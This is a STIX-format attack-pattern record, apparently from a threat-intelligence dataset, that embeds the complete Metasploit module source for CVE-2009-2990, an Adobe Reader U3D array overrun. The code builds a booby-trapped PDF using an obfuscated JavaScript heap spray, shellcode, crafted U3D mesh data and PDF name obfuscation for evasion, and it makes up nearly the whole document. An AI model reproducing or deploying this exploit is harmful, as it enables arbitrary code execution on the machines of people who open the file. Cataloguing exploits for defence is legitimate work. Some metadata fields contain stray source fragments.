{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0797ab28-fdd0-452e-b3c1-6b1f65f6b2d2",
    "created": "2024-08-14T17:04:58.986206Z",
    "modified": "2024-08-14T17:04:58.98621Z",
    "name": "Adobe U3D CLODProgressiveMeshDeclaration Array Overrun",
    "description": " This module exploits an array overflow in Adobe Reader and Adobe Acrobat. Affected versions include < 7.1.4, < 8.1.7, and < 9.2. By creating a specially crafted pdf that a contains malformed U3D data, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/fileformat/adobe_u3d_meshcont.rb",
            "external_id": "adobe_u3d_meshcont.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-2990"
        },
        {
            "source_name": "reference",
            "url": "http://sites.google.com/site/felipeandresmanzano/"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/support/security/bulletins/apsb09-15.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Adobe U3D CLODProgressiveMeshDeclaration Array Overrun',\n      'Description'    => %q{\n          This module exploits an array overflow in Adobe Reader and Adobe Acrobat.\n        Affected versions include < 7.1.4, < 8.1.7, and < 9.2. By creating a\n        specially crafted pdf that a contains malformed U3D data, an attacker may\n        be able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Felipe Andres Manzano <felipe.andres.manzano[at]gmail.com>',\n          'jduck'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-2990' ],\n          [ 'OSVDB', '58920' ],\n          [ 'BID', '36665' ],\n          [ 'URL', 'http://sites.google.com/site/felipeandresmanzano/' ],\n          [ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb09-15.html' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n          'DisableNops'\t => true\n        },\n      'Platform'       => %w{ win linux },\n      'Targets'        =>\n        [\n          # test results (on Windows XP SP3)\n          # reader 7.0.5 - untested\n          # reader 7.0.8 - untested\n          # reader 7.0.9 - untested\n          # reader 7.1.0 - untested\n          # reader 7.1.1 - untested\n          # reader 8.0.0 - untested\n          # reader 8.1.2 - works\n          # reader 8.1.3 - works\n          # reader 8.1.4 - untested\n          # reader 8.1.5 - untested\n          # reader 8.1.6 - untested\n          # reader 9.0.0 - untested\n          # reader 9.1.0 - works\n          [ 'Adobe Reader Windows Universal (JS Heap Spray)',\n            {\n              'Index'\t\t=> 0x01d10000,\n              'Platform'\t=> 'win',\n              'Arch'\t\t=> ARCH_X86,\n              'escA'\t\t=> 0x0f0f0f0f,\n              'escB'\t\t=> 0x16161616,\n              'escC'\t\t=> 0x1c1c1c1c\n            }\n          ],\n\n          # untested\n          [ 'Adobe Reader Linux Universal (JS Heap Spray)',\n            {\n              'Index'\t\t=> 0xfffffe3c,\n              'Platform'\t=> 'linux',\n              'Arch'\t\t=> ARCH_X86,\n              'escA'\t\t=> 0x75797959,\n              'escB'\t\t=> 0xa2a2a2a2,\n              'escC'\t\t=> 0x9c9c9c9c\n            }\n          ]\n        ],\n      'DisclosureDate' => '2009-10-13',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),\n      ])\n\n  end\n\n\n\n  def exploit\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Make some nops\n    nops    = Rex::Text.to_unescape(make_nops(4))\n\n    # prepare the pointers!\n    ptrA = Rex::Text.to_unescape([target['escA']].pack('V'), Rex::Arch.endian(target.arch))\n    ptrB = Rex::Text.to_unescape([target['escB']].pack('V'), Rex::Arch.endian(target.arch))\n    ptrC = Rex::Text.to_unescape([target['escC']].pack('V'), Rex::Arch.endian(target.arch))\n\n    script = <<-EOF\nvar nopz = unescape(\"#{nops}\");\nfunction mkSlice(stringy,size,rest){\n  while (stringy.length <= size/2)\n    stringy += stringy;\n  stringy = stringy.substring(0, size/2 -32/2 -4/2 - rest -2/2);\n  return stringy;\n};\n\nfunction spray(escA,escB,escC,escShellcode){\n  var loop1;\n  var pointersA = unescape(escA);\n  var pointersB = unescape(escB);\n  var pointersC = unescape(escC);\n  var shellcode = unescape(escShellcode);\n\n  pointersA_slide=mkSlice(pointersA,0x100000, pointersA.length);\n  pointersB_slide=mkSlice(pointersB,0x100000, pointersB.length);\n  pointersC_slide=mkSlice(pointersC,0x100000, pointersC.length);\n  nop_slide = mkSlice(nopz,0x100000, shellcode.length);\n  var xarr = new Array();\n  for (loop1 = 0; loop1 < 400; loop1++) {\n    if(loop1<100)\n      xarr[loop1] = pointersA_slide+pointersA;\n    else if(loop1<200)\n      xarr[loop1] = pointersB_slide+pointersB;\n    else if(loop1<300)\n      xarr[loop1] = pointersC_slide+pointersC;\n    else\n      xarr[loop1] = nop_slide+shellcode;\n    }\n    return xarr;\n  };\n  var memoryz = spray(\"#{ptrA}\",\"#{ptrB}\",\"#{ptrC}\",\"#{shellcode}\");\n  this.pageNum = 1;\nEOF\n\n    # Obfuscate it up a bit\n    script = obfuscate_js(script,\n      'Symbols' => {\n        'Variables' => %W{ pointersA_slide pointersA escA pointersB_slide pointersB escB pointersC_slide pointersC escC escShellcode nop_slide shellcode stringy size rest nopz loop1 xarr memoryz },\n        'Methods' => %W{ mkSlice spray }\n      }).to_s\n\n    # create the u3d stuff\n    u3d = make_u3d_stream(target['Index'], \"E\" * 11)\n\n    # Create the pdf\n    pdf = make_pdf(script, u3d)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n\n    file_create(pdf)\n  end\n\n\n  def obfuscate_js(javascript, opts)\n    js = Rex::Exploitation::ObfuscateJS.new(javascript, opts)\n    js.obfuscate\n    return js\n  end\n\n\n  def random_non_ascii_string(count)\n    result = \"\"\n    count.times do\n      result << (rand(128) + 128).chr\n    end\n    result\n  end\n\n  def io_def(id)\n    \"%d 0 obj\\n\" % id\n  end\n\n  def io_ref(id)\n    \"%d 0 R\" % id\n  end\n\n  #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/\n  def n_obfu(str)\n\n    result = \"\"\n    str.scan(/./u) do |c|\n      if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'\n        result << \"#%x\" % c.unpack(\"C*\")[0]\n      else\n        result << c\n      end\n    end\n    result\n  end\n\n  def ascii_hex_whitespace_encode(str)\n    result = \"\"\n    whitespace = \"\"\n    str.each_byte do |b|\n      result << whitespace << \"%02x\" % b\n      whitespace = \" \" * (rand(3) + 1)\n    end\n    result << \">\"\n  end\n\n\n  def u3d_pad(str, char=\"\\x00\")\n    ret = \"\"\n    if (str.length % 4) > 0\n      ret << char * (4 - (str.length % 4))\n    end\n    return ret\n  end\n\n\n  def make_u3d_stream(index, meshname)\n\n    # build the U3D header (length will be patched in later)\n    hdr_data = [1,0].pack('n*') # version info\n    hdr_data << [0,0x24,31337,0,0x6a].pack('VVVVV')\n    hdr = \"U3D\\x00\"\n    hdr << [hdr_data.length,0].pack('VV')\n    hdr << hdr_data\n\n    # mesh declaration\n    decl_data = [meshname.length].pack('v')\n    decl_data << meshname\n    decl_data << [0].pack('V') # chain idx\n    # max mesh desc\n    decl_data << [0].pack('V') # mesh attrs\n    decl_data << [0xc322].pack('V') # face count\n    decl_data << [0x6226].pack('V') # position count\n    decl_data << [0x24966].pack('V') # normal count\n    decl_data << [0].pack('V') # diffuse color count\n    decl_data << [0].pack('V') # specular color count\n    decl_data << [0].pack('V') # texture coord count\n    decl_data << [1].pack('V') # shading count\n    # shading desc\n    decl_data << [0].pack('V') # shading attr\n    decl_data << [1].pack('V') # texture layer count\n    decl_data << [0].pack('V') # texture coord dimensions\n    decl_data << [0].pack('V') # original shading id\n    # minimum resolution\n    decl_data << [0x6226].pack('V') # final maximum resolution (needs to be bigger than the minimum)\n    # quality factors\n    decl_data << [0x12c].pack('V') # position quality factor\n    decl_data << [0x12c].pack('V') # normal quality factor\n    decl_data << [0x12c].pack('V') # texture coord quality factor\n    # inverse quantiziation\n    decl_data << [0x3f0b1e6c].pack('V') # position inverse quant\n    decl_data << [0x3b6f05a6].pack('V') # normal inverse quant\n    decl_data << [0x3b6f05a6].pack('V') # texture coord inverse quant\n    decl_data << [0x3c2df54a].pack('V') # diffuse color inverse quant\n    decl_data << [0x3c2df54a].pack('V') # specular color inverse quant\n    # resource params\n    decl_data << [0x3f666666].pack('V') # normal crease param\n    decl_data << [0x3f000000].pack('V') # normal update param\n    decl_data << [0x3f7c28f6].pack('V') # normal tolerance param\n    # skeleton description\n    decl_data << [0].pack('V') # bone count\n    # padding\n    mesh_decl = [0xffffff31,decl_data.length,0].pack('VVV')\n    mesh_decl << decl_data\n    mesh_decl << u3d_pad(decl_data)\n\n    # build the modifier chain\n    chain_data = [meshname.length].pack('v')\n    chain_data << meshname\n    chain_data << [1].pack('V') # type (model resource)\n    chain_data << [0].pack('V') # attributes (no bounding info)\n    chain_data << u3d_pad(chain_data)\n    chain_data << [1].pack('V') # number of modifiers\n    chain_data << mesh_decl\n    modifier_chain = [0xffffff14,chain_data.length,0].pack('VVV')\n    modifier_chain << chain_data\n\n    # mesh continuation\n    cont_data = [meshname.length].pack('v')\n    cont_data << meshname\n    cont_data << [0].pack('V') # chain idx\n    cont_data << [0].pack('V') # start resolution\n    cont_data << [0x1000].pack('V') # end resolution\n    # 4096 continuation blocks\n    cont_data << [index].pack('V') # split position index\n    cont_data << [0].pack('v') # new diffuse color count\n    cont_data << [0].pack('v') # new specular color count\n    cont_data << [0].pack('v') # new text coord count\n    cont_data << [0].pack('V') # new face count\n    # unknown data\n    cont_data << \"\\x07\\x9c\\x00\\x00\\x00\\x37\\x0c\\x00\\x00\\xd0\\x02\\x00\\x00\\x3f\\xeb\\x95\\x0d\\x00\\x00\\x76\"\n    cont_data << \"\\x05\\x00\\x00\\xea\\x15\\x00\\x00\\xe2\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x82\\x22\\x8e\\x2f\"\n    cont_data << \"\\xaa\\x00\\x00\\x00\\xc2\\x13\\x23\\x00\\x20\\xbb\\x06\\x00\\x80\\xc2\\x1f\\x00\\x80\\x20\\x00\\x00\"\n    cont_data << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\xc0\\x14\\x01\\x00\\x20\\x44\"\n    cont_data << \"\\x0a\\x00\\x10\\x7e\\x4b\\x8d\\xf8\\x7c\\x32\\x6d\\x03\\x00\\x00\\xb2\\x0b\\x00\\x20\\xfd\\x19\\x00\"\n    cont_data << \"\\x20\\xb6\\xe9\\xea\\x2e\\x55\\x00\\x00\\x59\\x94\\x00\\x00\\x4c\\x00\\x01\\x00\\x1a\\xbb\\xa0\\xc8\"\n    cont_data << \"\\xc1\\x04\\x00\\x70\\xc4\\xa0\\x00\\x00\\x00\\x6c\\x98\\x46\\xac\\x04\\x00\\x60\\xf6\\x1c\\x00\\x20\"\n    cont_data << \"\\xa1\\x0f\\x00\\xa0\\x17\\x66\\x23\\x00\\x00\\xde\\x88\\x1d\\x00\\x00\\x7b\\x16\\x9f\\x72\\x9a\\x1d\"\n    cont_data << \"\\x15\\x00\\x80\\xeb\\x39\\x00\\x00\\x00\\x00\\x00\\x00\\x94\\xc8\\x00\\x00\\x54\\xce\\xfb\\x32\\x00\"\n    cont_data << \"\\x80\\xc4\\x3e\\xb0\\xc4\\x88\\xde\\x77\\x00\\x00\\x46\\x72\\x01\\x00\\xf0\\x56\\x01\\x00\\x8c\\x53\"\n    cont_data << \"\\xe9\\x10\\x9d\\x6b\\x06\\x00\"\n    cont_data << \"\\x50\" # pad\n    mesh_cont = [0xffffff3c,cont_data.length,0].pack('VVV')\n    mesh_cont << cont_data\n    #mesh_cont << u3d_pad(cont_data)\n    mesh_cont << \"\\xa2\\x00\" # manual padding\n\n    data = hdr\n    data << modifier_chain\n    data << mesh_cont\n\n    # patch the length\n    data[24,4] = [0x2b680].pack('V') # hardcode the data length\n\n    if index == 0x01d10000\n      #laziest hack ever! Another index must be found for using the following\n      # stream in windows.. and a lot of tests shoul be done.\n      return data\n    end\n\n\n    # linux version\n    # build the U3D header (length will be patched in later)\n    hdr_data = [1,0].pack('n*') # version info\n    hdr_data << [0,0x24,31337,0,0x6a].pack('VVVVV')\n    meta_str1 = \"alalala0\"\n    meta_str2 = \"\\xa8\" * 1024\n    hdr_meta = [1].pack('V')\n    hdr_meta << [meta_str1.length].pack('v')\n    hdr_meta << meta_str1\n    hdr_meta << [1].pack('V')\n    hdr_meta << [meta_str2.length].pack('V')\n    hdr_meta << meta_str2\n    hdr = \"U3D\\x00\"\n    hdr << [hdr_data.length,hdr_meta.length].pack('VV')\n    hdr << hdr_data\n    hdr << hdr_meta\n    hdr << u3d_pad(hdr_meta)\n\n    # mesh declaration\n    decl_data = [meshname.length].pack('v')\n    decl_data << meshname\n    decl_data << [0].pack('V') # chain idx\n    # max mesh desc\n    decl_data << [0].pack('V') # mesh attrs\n    decl_data << [0xc322].pack('V') # face count\n    decl_data << [0x6626].pack('V') # position count\n    decl_data << [4].pack('V') # normal count\n    decl_data << [0].pack('V') # diffuse color count\n    decl_data << [0].pack('V') # specular color count\n    decl_data << [0].pack('V') # texture coord count\n    decl_data << [1].pack('V') # shading count\n    # shading desc\n    decl_data << [0].pack('V') # shading attr\n    decl_data << [0].pack('V') # texture layer count\n    decl_data << [0].pack('V') # original shading id\n    # no texture coord dimensions\n    decl_data << [0x64].pack('V') # minimum resolution\n    decl_data << [0x65].pack('V') # final maximum resolution (needs to be bigger than the minimum)\n    # quality factors\n    decl_data << [0x12c].pack('V') # position quality factor\n    decl_data << [0x12c].pack('V') # normal quality factor\n    decl_data << [0x12c].pack('V') # texture coord quality factor\n    # inverse quantiziation\n    decl_data << [0].pack('V') # position inverse quant\n    decl_data << [0].pack('V') # normal inverse quant\n    decl_data << [0].pack('V') # texture coord inverse quant\n    decl_data << [0].pack('V') # diffuse color inverse quant\n    decl_data << [0].pack('V') # specular color inverse quant\n    # resource params\n    decl_data << [0].pack('V') # normal crease param\n    decl_data << [0].pack('V') # normal update param\n    decl_data << [0].pack('V') # normal tolerance param\n    # skeleton description\n    decl_data << [0].pack('V') # bone count\n    # padding\n    mesh_decl = [0xffffff31,decl_data.length,0].pack('VVV')\n    mesh_decl << decl_data\n    mesh_decl << u3d_pad(decl_data)\n\n    # build the modifier chain\n    chain_data = [meshname.length].pack('v')\n    chain_data << meshname\n    chain_data << [1].pack('V') # type (model resource)\n    chain_data << [0].pack('V') # attributes (no bounding info)\n    chain_data << u3d_pad(chain_data)\n    chain_data << [1].pack('V') # number of modifiers\n    chain_data << mesh_decl\n    modifier_chain = [0xffffff14,chain_data.length,0].pack('VVV')\n    modifier_chain << chain_data\n\n    # mesh continuation\n    cont_data = [meshname.length].pack('v')\n    cont_data << meshname\n    cont_data << [0].pack('V') # chain idx\n    cont_data << [0].pack('V') # start resolution\n    cont_data << [0x100].pack('V') # end resolution\n    # 256 continuation blocks\n    cont_data << [index].pack('V') # split position index\n    # unknown data\n    cont_data << [1].pack('V') * 10\n    cont_data << \"Feli\" * 20\n    mesh_cont = [0xffffff3c,cont_data.length,0].pack('VVV')\n    mesh_cont << cont_data\n    mesh_cont << u3d_pad(cont_data)\n\n    data = hdr\n    data << modifier_chain\n    data << mesh_cont\n\n    # patch the length\n    data[24,4] = [0x174].pack('V') # hardcode the data length\n    return data\n\n  end\n\n  def make_pdf(js, u3d_stream)\n\n    xref = []\n    eol = \"\\x0a\"\n    obj_end = \"\" << eol << \"endobj\" << eol\n\n    # the header\n    pdf = \"%PDF-1.7\" << eol\n\n    # filename/comment\n    pdf << \"%\" << random_non_ascii_string(4) << eol\n\n    # js stream\n    xref << pdf.length\n    compressed = Zlib::Deflate.deflate(ascii_hex_whitespace_encode(js))\n    pdf << io_def(1) << n_obfu(\"<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>\" % compressed.length) << eol\n    pdf << \"stream\" << eol\n    pdf << compressed << eol\n    pdf << \"endstream\" << eol\n    pdf << obj_end\n\n    # catalog\n    xref << pdf.length\n    pdf << io_def(3) << n_obfu(\"<</Type/Catalog/Outlines \") << io_ref(4)\n    pdf << n_obfu(\"/Pages \") << io_ref(5)\n    pdf << n_obfu(\"/OpenAction \") << io_ref(8)\n    pdf << n_obfu(\">>\")\n    pdf << obj_end\n\n    # outline\n    xref << pdf.length\n    pdf << io_def(4) << n_obfu(\"<</Type/Outlines/Count 0>>\")\n    pdf << obj_end\n\n    # kids\n    xref << pdf.length\n    pdf << io_def(5) << n_obfu(\"<</Type/Pages/Count 2/Kids [\")\n    pdf << io_ref(9) << \" \" # empty page\n    pdf << io_ref(10) # u3d page\n    pdf << n_obfu(\"]>>\")\n    pdf << obj_end\n\n    # u3d stream\n    xref << pdf.length\n    pdf << io_def(6) << n_obfu(\"<</Type/3D/Subtype/U3D/Length %s>>\" % u3d_stream.length) << eol\n    pdf << \"stream\" << eol\n    pdf << u3d_stream << eol\n    pdf << \"endstream\"\n    pdf << obj_end\n\n    # u3d annotation object\n    xref << pdf.length\n    pdf << io_def(7) << n_obfu(\"<</Type/Annot/Subtype\")\n    pdf << \"/3D/3DA <</A/PO/DIS/I>>\"\n    pdf << n_obfu(\"/Rect [0 0 640 480]/3DD \") << io_ref(6) << n_obfu(\"/F 7>>\")\n    pdf << obj_end\n\n    # js dict\n    xref << pdf.length\n    pdf << io_def(8) << n_obfu(\"<</Type/Action/S/JavaScript/JS \") + io_ref(1) + \">>\" << obj_end\n\n    # page 0 (empty)\n    xref << pdf.length\n    pdf << io_def(9) << n_obfu(\"<</Type/Page/Parent \") << io_ref(5) << n_obfu(\"/MediaBox [0 0 640 480]\")\n    pdf << n_obfu(\" >>\")\n    pdf << obj_end\n\n    # page 1 (u3d)\n    xref << pdf.length\n    pdf << io_def(10) << n_obfu(\"<</Type/Page/Parent \") << io_ref(5) << n_obfu(\"/MediaBox [0 0 640 480]\")\n    pdf << n_obfu(\"/Annots [\") << io_ref(7) << n_obfu(\"]\")\n    pdf << n_obfu(\">>\")\n    pdf << obj_end\n\n    # xrefs\n    xrefPosition = pdf.length\n    pdf << \"xref\" << eol\n    pdf << \"0 %d\" % (xref.length + 1) << eol\n    pdf << \"0000000000 65535 f\" << eol\n    xref.each do |index|\n      pdf << \"%010d 00000 n\" % index << eol\n    end\n\n    # trailer\n    pdf << \"trailer\" << eol\n    pdf << n_obfu(\"<</Size %d/Root \" % (xref.length + 1)) << io_ref(3) << \">>\" << eol\n    pdf << \"startxref\" << eol\n    pdf << xrefPosition.to_s() << eol\n    pdf << \"%%EOF\" << eol\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-10-13",
    "x_mitre_platforms": [
        "linux'"
    ]
}